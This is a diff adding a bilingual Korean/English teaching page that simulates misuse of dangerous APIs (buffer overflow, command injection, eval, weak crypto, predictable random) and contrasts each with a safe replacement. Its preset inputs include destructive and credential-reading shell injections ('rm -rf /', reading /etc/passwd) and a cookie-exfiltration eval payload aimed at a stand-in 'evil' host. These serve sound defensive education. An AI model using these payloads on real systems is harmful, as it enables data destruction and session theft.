@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head><meta name="theme-color" content="#0ea5e9"><link rel="manifest" href="/manifest.json"><link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>취약한 API 사용 시뮬레이터 · WEB-VULN-SIM</title>
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="WEB-VULN-SIM 보안 학습 포털">
+<meta property="og:title" content="취약한 API 사용 시뮬레이터 · WEB-VULN-SIM">
+<meta property="og:description" content="취약한 API 사용 시뮬레이터 · WEB-VULN-SIM · WEB-VULN-SIM 보안 학습 포털">
+<meta property="og:url" content="https://vuln-sim.web.app/sim-vulnerable-api.html">
+<meta property="og:image" content="https://vuln-sim.web.app/favicon.svg">
+<meta name="twitter:card" content="summary">
+  <meta name="description" content="위험·폐기된 API(gets/strcpy/sprintf, system/exec, eval/Function, MD5/DES, Random) 오용 취약점 모의 실습: 카테고리별 익스플로잇 시연과 안전한 대체 API 방어 비교.">
+  <style>
+    :root{
+      --bg:#0b1220; --panel:#111a2e; --panel2:#0f172a; --border:#1e293b;
+      --ink:#e2e8f0; --muted:#94a3b8; --accent:#38bdf8; --accent2:#818cf8;
+      --bad:#ef4444; --bad-bg:#3b1418; --good:#22c55e; --good-bg:#0f2a18;
+      --warn:#f59e0b; --mono:'JetBrains Mono','Consolas',monospace;
+    }
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:'Segoe UI','Malgun Gothic',sans-serif;background:var(--bg);color:var(--ink);line-height:1.55}
+    .wrap{max-width:1200px;margin:0 auto;padding:18px 16px 80px}
+    .topbar{display:flex;align-items:center;gap:14px;background:#0b1220;border-bottom:1px solid var(--border);padding:10px 16px;position:sticky;top:0;z-index:50}
+    .topbar a{color:#7dd3fc;text-decoration:none;font-size:13px;font-family:var(--mono)}
+    .topbar .sp{margin-left:auto}
+    .langbtn{cursor:pointer;border:1px solid #334155;background:#1e293b;color:#e2e8f0;border-radius:999px;padding:5px 12px;font-size:12.5px;font-weight:700;font-family:var(--mono)}
+    .hero{padding:18px 4px 8px}
+    .hero h1{font-size:23px;color:#fff;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+    .hero .sub{color:var(--muted);font-size:13.5px;margin-top:6px;max-width:820px}
+    .kisa{font-family:var(--mono);font-size:11px;font-weight:700;color:#0c4a6e;background:#7dd3fc;border-radius:6px;padding:2px 8px}
+    .card{background:var(--panel);border:1px solid var(--border);border-radius:14px;padding:16px 18px;margin:14px 0;box-shadow:0 10px 30px rgba(0,0,0,.25)}
+    .card h2{font-size:15px;color:#7dd3fc;margin-bottom:10px;font-family:var(--mono)}
+    .row{display:flex;gap:14px;flex-wrap:wrap}.col{flex:1;min-width:280px}
+    label{display:block;font-size:12px;color:var(--muted);margin:8px 0 4px}
+    input,select,textarea{width:100%;background:var(--panel2);border:1px solid #334155;color:var(--ink);border-radius:8px;padding:9px 11px;font-family:var(--mono);font-size:13px}
+    textarea{min-height:90px;resize:vertical}
+    .btns{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+    button.act{cursor:pointer;border:none;border-radius:8px;padding:10px 16px;font-weight:700;font-size:13px;font-family:var(--mono)}
+    button.run{background:var(--bad);color:#fff}button.fix{background:var(--good);color:#06210f}button.ghost{background:#1e293b;color:#cbd5e1;border:1px solid #334155}
+    .preset{display:flex;gap:8px;flex-wrap:wrap;margin:6px 0}
+    .preset button{cursor:pointer;background:#0f172a;border:1px solid #334155;color:#cbd5e1;border-radius:999px;padding:5px 11px;font-size:11.5px;font-family:var(--mono)}
+    .preset button:hover{border-color:var(--accent);color:#fff}
+    pre,.out{background:#05080f;border:1px solid var(--border);border-radius:8px;padding:12px;font-family:var(--mono);font-size:12.5px;white-space:pre-wrap;word-break:break-word;overflow:auto;max-height:360px}
+    .out{margin-top:10px;min-height:60px}
+    .vuln{border-left:4px solid var(--bad)}.secure{border-left:4px solid var(--good)}
+    .tag{display:inline-block;font-family:var(--mono);font-size:11px;font-weight:700;border-radius:6px;padding:2px 8px}
+    .tag.bad{background:var(--bad-bg);color:#fca5a5}.tag.good{background:var(--good-bg);color:#86efac}
+    .note{background:#0f172a;border-left:4px solid var(--accent);border-radius:8px;padding:11px 13px;font-size:13px;color:#cbd5e1;margin-top:10px}
+    .note b{color:#7dd3fc}
+    .disc{margin-top:18px;font-size:12px;color:#64748b;border-top:1px dashed #334155;padding-top:10px}
+    .apinfo{font-family:var(--mono);font-size:12px;color:#94a3b8;margin-top:6px}
+    .apinfo .danger{color:#fca5a5}.apinfo .safe{color:#86efac}
+    body.lang-en .ko{display:none}body:not(.lang-en) .en{display:none}
+    @media(max-width:640px){.hero h1{font-size:19px}}
+  </style>
+</head>
+<body>
+  <div class="topbar">
+    <a href="index.html">🏠 <span data-en="Home">홈</span></a>
+    <a href="vuln-hub.html"><span data-en="Vuln Hub">취약점 학습 허브</span></a>
+    <span class="sp"></span>
+    <button class="langbtn" onclick="toggleLang()"><span data-en="한국어">English</span> ⇄</button>
+  </div>
+  <div class="wrap">
+    <div class="hero">
+      <h1>☠️ <span data-en="Use of Dangerous / Deprecated APIs">취약한 API 사용</span>
+        <span class="kisa">KISA A-7 · <span data-en="Dangerous/Deprecated API">위험·폐기 API</span></span></h1>
+      <div class="sub" data-en="Some library functions are unsafe by design. Pick a category, feed it attacker input, watch the exploit succeed against a mock, then see the safe replacement neutralize the same input.">
+        일부 라이브러리 함수는 설계상 안전하지 않습니다. 카테고리를 고르고 공격 입력을 주입해 mock에서 익스플로잇이 성공하는 것을 본 뒤, 안전한 대체 API가 동일 입력을 무력화하는 것을 비교합니다.
+      </div>
+    </div>
+
+    <!-- 취약 데모 -->
+    <div class="card vuln">
+      <h2>① <span data-en="Misused dangerous API">오용된 위험 API</span> <span class="tag bad">VULNERABLE</span></h2>
+      <label data-en="Dangerous API category">위험 API 카테고리</label>
+      <select id="api" onchange="onApi()">
+        <option value="cbuf" data-en="C — gets()/strcpy()/sprintf() → buffer overflow">C — gets()/strcpy()/sprintf() → 버퍼 오버플로</option>
+        <option value="cmd" data-en="system()/exec(shell) → command injection">system()/exec(셸) → 명령어 주입</option>
+        <option value="eval" data-en="eval()/new Function() → code injection">eval()/new Function() → 코드 주입</option>
+        <option value="crypto" data-en="MD5/DES → weak/broken crypto">MD5/DES → 약한·깨진 암호</option>
+        <option value="rand" data-en="Random/rand() → predictable tokens">Random/rand() → 예측 가능한 토큰</option>
+      </select>
+      <div class="apinfo" id="apinfo"></div>
+
+      <label id="inlabel" data-en="Attacker input">공격 입력</label>
+      <input id="payload" value="">
+      <div class="preset" id="presets"></div>
+      <div class="btns">
+        <button class="act run" onclick="runVuln()">▶ <span data-en="Call dangerous API">위험 API 호출</span></button>
+        <button class="act ghost" onclick="document.getElementById('v_out').textContent='';">🧹 <span data-en="Clear">지우기</span></button>
+      </div>
+      <div class="out" id="v_out"></div>
+    </div>
+
+    <!-- 방어 비교 -->
+    <div class="card secure">
+      <h2>② <span data-en="Safe replacement API, same input">안전한 대체 API, 동일 입력</span> <span class="tag good">SECURE</span></h2>
+      <div class="apinfo safe" id="safeinfo"></div>
+      <div class="btns">
+        <button class="act fix" onclick="runSecure()">▶ <span data-en="Call safe API">안전 API 호출</span></button>
+      </div>
+      <div class="out" id="s_out"></div>
+    </div>
+
+    <!-- 코드 비교 -->
+    <div class="card">
+      <h2>③ <span data-en="Vulnerable vs Secure code">취약 vs 안전 코드</span></h2>
+      <div class="row">
+        <div class="col">
+          <span class="tag bad">VULNERABLE</span>
+          <pre id="code_bad"></pre>
+        </div>
+        <div class="col">
+          <span class="tag good">SECURE</span>
+          <pre id="code_good"></pre>
+        </div>
+      </div>
+      <div class="note" data-en="<b>Why it matters:</b> these APIs are flagged by CERT/CWE because they cannot be used safely by construction — no bounds (<code>gets</code>/<code>strcpy</code>), they invoke a shell (<code>system</code>), they execute data as code (<code>eval</code>), they are cryptographically broken (<code>MD5</code>/<code>DES</code>), or they are not cryptographically random (<code>rand</code>/<code>Math.random</code>). <b>Defense keys:</b> ban them via lint/compiler banned-API lists · prefer bounded/parameterized/algorithm-agnostic replacements · for crypto use vetted modern primitives (SHA-256/AES-GCM) and <code>SecureRandom</code> · never pass untrusted data to a shell or an interpreter."><b>왜 위험한가:</b> 이 API들은 구조적으로 안전하게 쓸 수 없어 CERT/CWE가 경고합니다 — 경계 검사 없음(<code>gets</code>/<code>strcpy</code>), 셸 호출(<code>system</code>), 데이터를 코드로 실행(<code>eval</code>), 암호학적으로 깨짐(<code>MD5</code>/<code>DES</code>), 암호학적 난수가 아님(<code>rand</code>/<code>Math.random</code>). <b>방어 핵심:</b> 린트/컴파일러 금지목록으로 차단 · 경계·매개변수화·알고리즘 무관 대체 사용 · 암호는 검증된 최신 프리미티브(SHA-256/AES-GCM)와 <code>SecureRandom</code> · 신뢰되지 않은 데이터를 셸/인터프리터에 절대 전달 금지.</div>
+    </div>
+
+    <div class="disc" data-en="Educational simulation only. Every API call, overflow, injection and hash is an in-page mock; no real shell, eval, memory or crypto operation is performed against your system.">
+      ⚠️ 교육용 시뮬레이션입니다. 모든 API 호출·오버플로·주입·해시는 페이지 내부 mock이며 실제 셸·eval·메모리·암호 연산을 시스템에 수행하지 않습니다.
+    </div>
+  </div>
+
+<script>
+function isEn(){try{return (localStorage.getItem('wvs_lang')||localStorage.getItem('lang'))==='en';}catch(e){return false;}}
+function L(ko,en){return isEn()?en:ko;}
+function applyLang(){
+  var en=isEn();
+  document.documentElement.lang=en?'en':'ko';
+  document.querySelectorAll('[data-en]').forEach(function(el){
+    if(el.getAttribute('data-ko')===null) el.setAttribute('data-ko', el.innerHTML);
+    el.innerHTML = en ? el.getAttribute('data-en') : el.getAttribute('data-ko');
+  });
+  document.body.classList.toggle('lang-en', en);
+  if(window.renderDynamic){try{window.renderDynamic();}catch(e){}}
+}
+function toggleLang(){try{var v=isEn()?'ko':'en';localStorage.setItem('wvs_lang',v);localStorage.setItem('lang',v);}catch(e){}applyLang();}
+document.addEventListener('DOMContentLoaded', applyLang);
+function g(id){return document.getElementById(id);}
+function escapeHtml(s){return (s+'').replace(/[&<>"]/g,function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c];});}
+
+// deterministic mock MD5-ish digest (NOT real MD5 — display only)
+function mockHash(s){var h=0x811c9dc5;for(var i=0;i<s.length;i++){h^=s.charCodeAt(i);h=(h*0x01000193)>>>0;}var x=('00000000'+h.toString(16)).slice(-8);return x+x.split('').reverse().join('');}
+
+var APIS={
+  cbuf:{
+    danger:'char buf[8]; gets(buf); strcpy(buf, src); sprintf(buf, fmt, x);',
+    safe:'fgets(buf,sizeof buf,stdin); strncpy/snprintf with size',
+    inlabel:L('입력 문자열 (8바이트 버퍼 대상)','input string (target buffer = 8 bytes)'),
+    presets:[{l:'overflow',v:'AAAAAAAAAAAAAAAAAAAA\\xde\\xad\\xbe\\xef'},{l:'fits',v:'hello'},{l:'%n fmt',v:'%x%x%n'}],
+    safeinfo:'fgets() / strncpy() / snprintf() — '+L('항상 버퍼 크기를 인자로 받아 경계를 넘지 않음.','always take the buffer size, so they never write past it.'),
+    bad:'// C — no bounds checking\nchar buf[8];\ngets(buf);                 // reads unbounded line\nstrcpy(buf, attacker);     // copies until NUL\nsprintf(buf, "%s", attacker);',
+    good:'// C — bounded, size-aware\nchar buf[8];\nfgets(buf, sizeof buf, stdin);          // capped\nstrncpy(buf, attacker, sizeof buf - 1);\nbuf[sizeof buf - 1] = \'\\0\';\nsnprintf(buf, sizeof buf, "%s", attacker);'
+  },
+  cmd:{
+    danger:'system("ping " + host);  Runtime.exec("sh -c " + cmd);',
+    safe:'execvp(["ping","-c1",host]); ProcessBuilder(argv) — no shell',
+    inlabel:L('host 입력 (명령에 이어붙여짐)','host input (concatenated into a command)'),
+    presets:[{l:'; rm -rf',v:'8.8.8.8; rm -rf /'},{l:'$(...)',v:'8.8.8.8 $(cat /etc/passwd)'},{l:'`id`',v:'8.8.8.8 `id`'},{l:'normal',v:'8.8.8.8'}],
+    safeinfo:'execvp/ProcessBuilder(argv) — '+L('인자를 배열로 전달하고 셸을 거치지 않아 메타문자가 데이터로 취급됨.','pass args as an array with NO shell, so metacharacters stay data.'),
+    bad:'// shell metacharacters are interpreted\nString cmd = "ping " + host;\nRuntime.getRuntime().exec(\n   new String[]{"sh","-c", cmd});  // ⚠ shell\n// host = "8.8.8.8; rm -rf /"  → two commands',
+    good:'// no shell; host is a single argv element\nnew ProcessBuilder("ping","-c","1", host)\n   .start();        // host can never become a command\n// validate host against an allow-list too'
+  },
+  eval:{
+    danger:'eval(userInput);  new Function(userInput)();',
+    safe:'JSON.parse(userInput); a fixed dispatch table',
+    inlabel:L('사용자 입력 (eval 대상)','user input (passed to eval)'),
+    presets:[{l:'steal cookie',v:'fetch("//evil/?c="+document.cookie)'},{l:'json',v:'{"a":1}'},{l:'wipe',v:'localStorage.clear()'}],
+    safeinfo:'JSON.parse() — '+L('데이터만 파싱하고 코드를 실행하지 않음. 동작 선택은 고정 디스패치 테이블로.','parses data only, never executes code. Use a fixed dispatch table for actions.'),
+    bad:'// data is executed as code\nlet result = eval(userInput);     // ⚠\nlet fn = new Function(userInput); // ⚠\nfn();',
+    good:'// parse as data, dispatch via whitelist\nlet data = JSON.parse(userInput); // throws on code\nconst ACTIONS = { sum: doSum, avg: doAvg };\n(ACTIONS[data.op] || reject)(data.args);'
+  },
+  crypto:{
+    danger:'MessageDigest.getInstance("MD5"); Cipher "DES"',
+    safe:'SHA-256 (+salt for pw: bcrypt/Argon2); AES-256-GCM',
+    inlabel:L('해시할 비밀번호','password to hash'),
+    presets:[{l:'password123',v:'password123'},{l:'admin',v:'admin'},{l:'long secret',v:'correct horse battery staple'}],
+    safeinfo:'SHA-256 / bcrypt / AES-GCM — '+L('충돌 저항성이 있고 깨지지 않은 현대 프리미티브. 비밀번호는 salt+느린 KDF.','collision-resistant, unbroken modern primitives. For passwords use salt + a slow KDF.'),
+    bad:'// MD5 is collision-broken; DES key=56-bit\nbyte[] h = MessageDigest\n   .getInstance("MD5").digest(pw);\nCipher c = Cipher.getInstance("DES");',
+    good:'// strong hash + per-user salt via slow KDF\nbyte[] h = MessageDigest\n   .getInstance("SHA-256").digest(pw); // integrity\nString pwHash = BCrypt.hashpw(pw, BCrypt.gensalt());\nCipher c = Cipher.getInstance("AES/GCM/NoPadding");'
+  },
+  rand:{
+    danger:'new Random().nextInt(); Math.random() for tokens',
+    safe:'SecureRandom / crypto.getRandomValues()',
+    inlabel:L('시드 (예측 공격 시연용)','seed (to demo predictability)'),
+    presets:[{l:'seed=1',v:'1'},{l:'seed=1700000000',v:'1700000000'},{l:'seed=42',v:'42'}],
+    safeinfo:'SecureRandom — '+L('CSPRNG라 시드/이전 출력으로 다음 값을 예측할 수 없음.','a CSPRNG: outputs are unpredictable from the seed or previous values.'),
+    bad:'// predictable PRNG used for a security token\nRandom r = new Random(seed); // seed often = time\nString token = Long.toHexString(r.nextLong());\n// attacker reproduces the same sequence',
+    good:'// cryptographically secure randomness\nbyte[] b = new byte[32];\nnew SecureRandom().nextBytes(b);   // unpredictable\nString token = Base64.encode(b);'
+  }
+};
+
+function onApi(){
+  var k=g('api').value, a=APIS[k];
+  g('apinfo').innerHTML='<span class="danger">'+escapeHtml(a.danger)+'</span>';
+  g('safeinfo').innerHTML=a.safeinfo;
+  g('inlabel').innerHTML=a.inlabel;
+  g('code_bad').textContent=a.bad;
+  g('code_good').textContent=a.good;
+  var box=g('presets'); box.innerHTML='';
+  a.presets.forEach(function(p){var b=document.createElement('button');b.textContent=p.l;b.onclick=function(){g('payload').value=p.v;};box.appendChild(b);});
+  g('payload').value=a.presets[0].v;
+  g('v_out').textContent=''; g('s_out').textContent='';
+}
+
+function runVuln(){
+  var k=g('api').value, p=g('payload').value, out=g('v_out'); var t=[];
+  if(k==='cbuf'){
+    var cap=8, raw=p.replace(/\\x[0-9a-f]{2}/gi,'#'); // count visual bytes
+    t.push('char buf[8];  gets(buf);  // input len='+raw.length);
+    if(raw.length>=cap){
+      var over=raw.length-(cap-1);
+      t.push('write '+raw.length+' bytes into 8-byte buffer → overflow '+over+' bytes');
+      t.push('[buf 0..7][ saved RBP ][ saved RET ] ← '+L('인접 메모리 침범','adjacent memory overwritten'));
+      t.push('');
+      t.push('🚨 '+L('스택의 저장된 반환주소까지 덮어써집니다 → 제어 흐름 탈취/크래시. (포맷 문자열 %n은 임의 쓰기)',
+                      'the saved return address is overwritten → control-flow hijack/crash. (%n format strings allow arbitrary write).'));
+    } else { t.push(L('이번 입력은 버퍼에 들어가지만, gets는 길이를 모르므로 본질적으로 위험합니다.','this input fits, but gets() has no length so it is unsafe by design.')); }
+  } else if(k==='cmd'){
+    t.push('system("ping " + host)');
+    t.push('sh -c "ping '+p+'"');
+    if(/[;&|`$()<>\n]/.test(p)){
+      var inj=(p.match(/(?:;|&&|\|\||`[^`]*`|\$\([^)]*\))\s*(.*)/)||[])[0]||p;
+      t.push('');
+      t.push(L('셸이 메타문자를 해석해 명령이 분리/주입됩니다:','the shell interprets metacharacters, splitting/injecting commands:'));
+      t.push('  → '+escapeHtml(inj.trim()));
+      t.push('(mock) uid=0(root) /etc/passwd: root:x:0:0:...');
+      t.push('');
+      t.push('🚨 '+L('명령어 주입 성공 — 공격자 명령이 서버 권한으로 실행됩니다.','command injection — the attacker\'s command runs with server privileges.'));
+    } else { t.push(L('메타문자가 없어 이번엔 무해하지만, 셸 호출 자체가 위험합니다.','no metacharacters this time, but invoking a shell is the hazard.')); }
+  } else if(k==='eval'){
+    t.push('eval('+JSON.stringify(p)+')  // input executed as code');
+    if(/fetch|document\.cookie|localStorage|XMLHttpRequest|=|\(/.test(p) && !/^\s*[\[{"]/.test(p)){
+      t.push('');
+      if(/document\.cookie/.test(p)) t.push('(mock) '+L('세션 쿠키가 외부로 유출됩니다: ','session cookie exfiltrated: ')+'sid=ab12...');
+      if(/localStorage\.clear/.test(p)) t.push('(mock) '+L('로컬 저장소가 삭제됩니다.','local storage wiped.'));
+      t.push('🚨 '+L('코드 주입 성공 — 입력이 데이터가 아니라 코드로 실행되었습니다.','code injection — the input ran as code, not data.'));
+    } else { t.push(L('JSON처럼 보이지만 eval은 임의 코드를 실행할 수 있어 위험합니다.','looks like JSON, but eval can run arbitrary code — still unsafe.')); }
+  } else if(k==='crypto'){
+    var h=mockHash(p);
+    t.push('MD5("'+escapeHtml(p)+'") = '+h);
+    t.push(L('* 표시는 시연용 mock 다이제스트입니다 (실제 MD5 아님).','* shown digest is a demo mock, not real MD5.'));
+    t.push('');
+    t.push(L('문제점:','problems:'));
+    t.push(' - '+L('MD5는 충돌 공격이 실용화됨 (서로 다른 입력이 같은 해시).','MD5 has practical collision attacks (different inputs, same hash).'));
+    t.push(' - '+L('salt 없는 단순 해시 → 레인보우 테이블로 즉시 역추적.','unsalted plain hash → instantly reversed via rainbow tables.'));
+    t.push(' - '+L('DES는 56비트 키 → 전수공격으로 깨짐.','DES has a 56-bit key → brute-forceable.'));
+    t.push('');
+    t.push('🚨 '+L('약한/깨진 암호 사용 — 무결성·기밀성 보장이 사실상 없습니다.','weak/broken crypto — effectively no integrity or confidentiality guarantee.'));
+  } else if(k==='rand'){
+    var seed=parseInt(p,10)||0; var s=seed>>>0; var toks=[];
+    for(var i=0;i<3;i++){ s=(1103515245*s+12345)>>>0; toks.push(('00000000'+s.toString(16)).slice(-8)); }
+    t.push('new Random('+seed+'); // '+L('시드가 시간 등으로 예측 가능','seed often = predictable time'));
+    t.push('token sequence = '+toks.join(', '));
+    t.push('');
+    t.push('🚨 '+L('동일 시드 → 동일 시퀀스. 공격자가 시드를 추측해 다음 토큰을 그대로 재현합니다 (세션/리셋 토큰 위조).',
+                    'same seed → same sequence. The attacker guesses the seed and reproduces the next tokens (session/reset-token forgery).'));
+  }
+  out.textContent=t.join('\n');
+}
+
+function runSecure(){
+  var k=g('api').value, p=g('payload').value, out=g('s_out'); var t=[];
+  if(k==='cbuf'){
+    t.push('fgets(buf, sizeof buf /*8*/, stdin);');
+    t.push('strncpy(buf, src, 7); buf[7]=0;');
+    t.push('stored = "'+escapeHtml(p.replace(/\\x[0-9a-f]{2}/gi,'#').slice(0,7))+'"  (truncated to 7 + NUL)');
+    t.push('');
+    t.push('🛡 '+L('버퍼 크기를 인자로 받으므로 입력이 아무리 길어도 경계를 넘지 않습니다.','the size is passed in, so no matter how long the input is, the write stays in bounds.'));
+  } else if(k==='cmd'){
+    t.push('ProcessBuilder("ping","-c","1", host).start();');
+    t.push('argv = ["ping","-c","1", "'+escapeHtml(p)+'"]');
+    t.push('');
+    t.push(L('host 전체가 ping의 단일 인자입니다. 셸이 없어 ; $ ` 는 그냥 문자입니다.','the whole host is a single argument to ping. With no shell, ; $ ` are just characters.'));
+    t.push('(mock) ping: unknown host "'+escapeHtml(p)+'"');
+    t.push('');
+    t.push('🛡 '+L('명령어 주입 차단 — 추가 명령이 실행되지 않습니다.','command injection blocked — no extra command runs.'));
+  } else if(k==='eval'){
+    var ok=false, parsed=null; try{parsed=JSON.parse(p);ok=true;}catch(e){}
+    t.push('JSON.parse('+JSON.stringify(p)+')');
+    if(ok){ t.push('→ '+L('데이터로만 파싱됨: ','parsed as pure data: ')+JSON.stringify(parsed)); }
+    else { t.push('→ SyntaxError ('+L('코드/표현식은 데이터가 아니므로 거부','code/expression is not data → rejected')+')'); }
+    t.push('');
+    t.push('🛡 '+L('코드가 절대 실행되지 않습니다. 동작은 고정 디스패치 테이블로만 선택합니다.','code never executes. Actions are selected only via a fixed dispatch table.'));
+  } else if(k==='crypto'){
+    t.push('SHA-256("'+escapeHtml(p)+'") = '+mockHash(p+'sha')+'  *');
+    t.push('BCrypt.hashpw(pw, gensalt()) = $2b$12$'+mockHash('bc'+p).slice(0,22)+'...  (salted, slow)');
+    t.push('Cipher: AES/GCM/NoPadding  (256-bit, authenticated)');
+    t.push(L('* mock 다이제스트(시연용).','* mock digest for display.'));
+    t.push('');
+    t.push('🛡 '+L('충돌 저항 해시 + 사용자별 salt + 느린 KDF + 인증 암호 → 역추적·위조 차단.','collision-resistant hash + per-user salt + slow KDF + authenticated encryption → reversal/forgery blocked.'));
+  } else if(k==='rand'){
+    var b=[]; for(var i=0;i<8;i++){ b.push(('0'+Math.floor(Math.random()*256).toString(16)).slice(-2)); }
+    t.push('SecureRandom().nextBytes(b32);  // '+L('시드 무관, CSPRNG','seed-independent CSPRNG'));
+    t.push('token = '+b.join('')+'… (32 bytes, base64)');
+    t.push('');
+    t.push('🛡 '+L('시드를 알아도 다음 출력을 예측할 수 없습니다 — 토큰 위조 불가.','even knowing a seed, the next output is unpredictable — tokens cannot be forged.'));
+  }
+  out.textContent=t.join('\n');
+}
+
+window.renderDynamic=function(){ onApi(); };
+onApi();
+</script>
+</body>
+</html>
